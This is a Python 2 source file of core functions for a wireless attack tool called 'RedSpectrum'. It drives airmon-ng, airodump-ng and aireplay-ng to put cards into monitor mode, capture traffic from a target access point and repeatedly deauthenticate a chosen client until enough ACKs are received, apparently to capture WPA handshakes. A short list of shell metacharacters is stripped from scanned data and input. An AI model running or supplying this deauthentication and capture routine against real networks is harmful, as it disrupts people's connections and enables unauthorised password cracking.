#!/usr/bin/python
"""
RedSpectrum
April 1, 2017
Leopold von Niebelschuetz-Godlewski

Core functions.
"""
import os, shlex, subprocess, sys, time, threading
from config import FLUSH_WRITE_TIME, MAX_CLIENT_DEAUTH, MAX_DEAUTH_TRIES, MAX_PROC_WAIT, MIN_ACKs, PROC_DATA_TIME, WALK_TIME
from threading import Timer
try:
    from colorama import Fore, Style
except:
    print "Please install the \"colorama\" module!"
    sys.exit(1)

EVILCHARS = ['&', '|', '(', ')', ';', ',', '#']

def check_SSIDs(APs,ssids):
    ssidsLowered = [ssid.lower() for ssid in ssids]
    if ssidsLowered:
        foundTargetSSID = False
        for bssid,essid,channel,privacy,authentication,date in APs:
            if essid.lower() in ssidsLowered:
                foundTargetSSID = True
        if not foundTargetSSID:
            print_error("The specified SSID was not found in any CSV files within the CWD...")
            sys.exit(1)
    return 0

def clean_AP_data(APs):
    newAPs = []
    for bssid,essid,channel,privacy,authentication,date in APs:
        for evilChar in EVILCHARS:
            date           = date.replace(evilChar,'')
            bssid          = bssid.replace(evilChar,'')
            essid          = essid.replace(evilChar,'')
            channel        = channel.replace(evilChar,'')
            privacy        = privacy.replace(evilChar,'')
            authentication = authentication.replace(evilChar,'')
        newAPs.append((bssid,essid,channel,privacy,authentication,date))
    return newAPs

def clean_station_data(stations):
    newStations = []
    for station_mac,connected_bssid,date in stations:
        for evilChar in EVILCHARS:
            date            = date.replace(evilChar,'')
            station_mac     = station_mac.replace(evilChar,'')
            connected_bssid = connected_bssid.replace(evilChar,'')
        newStations.append((station_mac,connected_bssid,date))
    return newStations

def clean_user_input(user_input):
    for evilChar in EVILCHARS:
        user_input = user_input.replace(evilChar,'')
    return user_input

def countdown(seconds):
    for remaining in range(seconds, 0, -1):
        sys.stdout.write("\r")
        sys.stdout.write("{:2d} seconds remaining...".format(remaining))
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r")
    sys.stdout.flush()

def disable_interfering_processes(verbose=True):
    if verbose: print_warning("Attempting to disable all interfering processes...")
    cmd = 'airmon-ng check kill'
    stdout, stderr = run_process(cmd,MAX_PROC_WAIT)
    if stdout == '\n\n':
        if verbose: print_warning("Interfering processes already disabled, moving on...")
    elif stdout:
        if verbose: print stdout
    elif stderr:
        print_error("%s... Exiting..." % stderr)
        sys.exit(1)
    else:
        print_error("Are you sure you're running this on the latest and greatest Kali?... Exiting...")
        sys.exit(1)

def deauth(bssid,channel,station_mac,MAX_CLIENT_DEAUTH,outFileName,ListenInterface,AttackInterface,verbose):
    if ListenInterface == AttackInterface:
        ListenInterface = AttackInterface = enable_monitor_mode(ListenInterface,channel,verbose)
    else:
        ListenInterface = enable_monitor_mode(ListenInterface,channel,verbose)
        AttackInterface = enable_monitor_mode(AttackInterface,channel,verbose)
    captureResponse   = "airodump-ng -c %s --bssid %s -w %s %s" % (channel,bssid,outFileName,ListenInterface)
    deauthClient      = "aireplay-ng -0 %s -a %s -c %s %s" % (MAX_CLIENT_DEAUTH,bssid,station_mac,AttackInterface)
    os.system("nohup %s >/dev/null 2>&1 &" % captureResponse)
    if verbose: print_warning("\"%s\" successfully started..." % captureResponse)
    if verbose: print_warning("Executing \"%s\"..." % deauthClient)
    stdout = stderr  = ''
    ACK    = counter = 0
    killSignal       = 1
    stdout, stderr   = run_process(deauthClient,MAX_PROC_WAIT)
    if 'directed DeAuth' in stdout:
        ACK = get_ACK(stdout)
        if verbose: print stdout
    while (not stdout and not stderr) or ("No such BSSID available." in stdout) or ("but the AP uses channel" in stdout) or (ACK < MIN_ACKs):
        if counter+1 > MAX_DEAUTH_TRIES: break
        killSignal     = 1
        if not stdout and not stderr:
            if verbose: print_warning("Target BSSID broadcasts couldn't be found, try walking around...")
        elif "No such BSSID available." in stdout:
            if verbose: print_warning("Target BSSID broadcasts couldn't be found, try walking around...")
        elif "but the AP uses channel" in stdout:
            startIndex  = stdout.find("Waiting for beacon frame")
            newChanLine = stdout[startIndex:]
            newChannel  = newChanLine[newChanLine.find(" on channel ")+len(" on channel "):newChanLine.find('\n')]
            killSignal  = 9
            if verbose: print_warning("The AP uses channel %s but the card is running on channel %s..." % (channel,newChannel))
            if ListenInterface == AttackInterface:
                ListenInterface = AttackInterface = disable_monitor_mode(ListenInterface,verbose)
                ListenInterface = AttackInterface = enable_monitor_mode(ListenInterface,channel,verbose)
            else:
                ListenInterface = disable_monitor_mode(ListenInterface,verbose)
                AttackInterface = disable_monitor_mode(AttackInterface,verbose)
                ListenInterface = enable_monitor_mode(ListenInterface,channel,verbose)
                AttackInterface = enable_monitor_mode(AttackInterface,channel,verbose)
        elif 'directed DeAuth' in stdout and (ACK < MIN_ACKs):
            if verbose: print_warning("Not enough ACKs received, try walking around...")
            ACK = get_ACK(stdout)
        elif stderr:
            if verbose: print_error(stderr)
            sys.exit(1)
        countdown(WALK_TIME)
        if verbose: print_warning("Executing \"%s\"... (%d/%d)" % (deauthClient,counter+1,MAX_DEAUTH_TRIES))
        stdout, stderr = run_process(deauthClient,MAX_PROC_WAIT)
        if 'directed DeAuth' in stdout:
            ACK = get_ACK(stdout)
            if verbose: print stdout
            if (ACK >= MIN_ACKs):
                break
        counter += 1
    if verbose: print_warning("Waiting for Airodump-ng to process data...")
    countdown(PROC_DATA_TIME)
    kill_process("airodump-ng",killSignal)
    if verbose: print_warning("Waiting for Airodump-ng to flush write buffers...")
    countdown(FLUSH_WRITE_TIME)
    if ListenInterface == AttackInterface:
        ListenInterface = AttackInterface = disable_monitor_mode(ListenInterface,verbose)
    else:
        ListenInterface = disable_monitor_mode(ListenInterface,verbose)
        AttackInterface = disable_monitor_mode(AttackInterface,verbose)
    return (ACK,(ListenInterface,AttackInterface))

def disable_monitor_mode(wirelessInterface,verbose=True):
    if verbose: print_warning("Attempting to disable monitor mode on %s..." % wirelessInterface)
    cmd = 'airmon-ng stop %s' % wirelessInterface
    stdout, stderr = run_process(cmd,MAX_PROC_WAIT)
    if "are trying to stop a device that" in stdout:
        if verbose: print_warning("Monitor mode is already disabled, moving on...")
    elif 'disabled for' in stdout:
        startIndex        = stdout.find("enabled on")
        interfaceLine     = stdout[startIndex:]
        wirelessInterface = interfaceLine[interfaceLine.find(']')+1:interfaceLine.find(')')]
        if verbose: print stdout
    elif stderr:
        print_error("%s... Exiting..." % stderr)
        sys.exit(1)
    else:
        print_error("Ensure you supplied the correct wireless interface name... Exiting...")
        sys.exit(1)
    return wirelessInterface

def enable_monitor_mode(wirelessInterface,channel='',verbose=True):
    if verbose: print_warning("Attempting to put %s into monitor mode on channel %s..." % (wirelessInterface,channel))
    cmd = 'airmon-ng start %s %s' % (wirelessInterface,channel)
    stdout, stderr = run_process(cmd,MAX_PROC_WAIT)
    if "monitor mode already enabled" in stdout:
        if verbose: print_warning("%s already has monitor mode enabled..." % wirelessInterface)
        wirelessInterface = disable_monitor_mode(wirelessInterface)
        wirelessInterface = enable_monitor_mode(wirelessInterface,channel)
    elif 'monitor mode vif enabled for' in stdout:
        startIndex        = stdout.find(" on ")
        interfaceLine     = stdout[startIndex:]
        wirelessInterface = interfaceLine[interfaceLine.find(']')+1:interfaceLine.find(')')]
        if verbose: print stdout
    elif stderr:
        print_error("%s... Exiting..." % stderr)
        sys.exit(1)
    else:
        print_error("Ensure you supplied the correct wireless interface name... Exiting...")
        sys.exit(1)
    return wirelessInterface

def find_output_files(outFileName,fileExtension):
    outFileNames      = [file for file in os.listdir('.') if file.startswith(outFileName)]
    outTargetFileName = ''
    for outFile in outFileNames:
        if outFile.endswith(fileExtension) and not 'kismet' in outFile:
            outTargetFileName = outFile
    if not outTargetFileName:
        print_error("Could not locate the newly produced Airodump-ng CSV output file... Exiting...")
        sys.exit(1)
    return outFileNames, outTargetFileName

def get_ACK(stdout):
    try:
        lastLine = stdout.split('\r')[-2]
        ACK      = int(lastLine[lastLine.find("] [")+len("] ["):lastLine.find('|')])
    except:
        return 0
    return ACK

def kill_process(processName,killSignal=1):
    PIDs = []
    for dirname in os.listdir('/proc'):
        if dirname == 'curproc':
            continue
        try:
            with open('/proc/{}/cmdline'.format(dirname), mode='rb') as fd:
                content = fd.read().decode().split('\x00')
        except Exception:
            continue
        if processName in content[0]:
            if ' '.join(content).startswith(processName):
                PIDs.append(dirname)
    for PID in PIDs:
        cmd = 'kill -%d %s >/dev/null 2>&1' % (killSignal,PID)
        os.system(cmd)

def print_error(errorText):
    print Fore.RED + "[ERROR]" + Style.RESET_ALL + " %s" % errorText

def print_warning(warningText):
    print Fore.YELLOW + "[!]" + Style.RESET_ALL + " %s" % warningText

def print_success(successText):
    print Fore.GREEN + "[W00T]" + Style.RESET_ALL + " %s" % successText

def run_process(cmd, timeout_sec):
  proc = subprocess.Popen(shlex.split(cmd), shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  kill_proc = lambda p: p.kill()
  timer = Timer(timeout_sec, kill_proc, [proc])
  try:
    timer.start()
    return proc.communicate()
  finally:
    timer.cancel()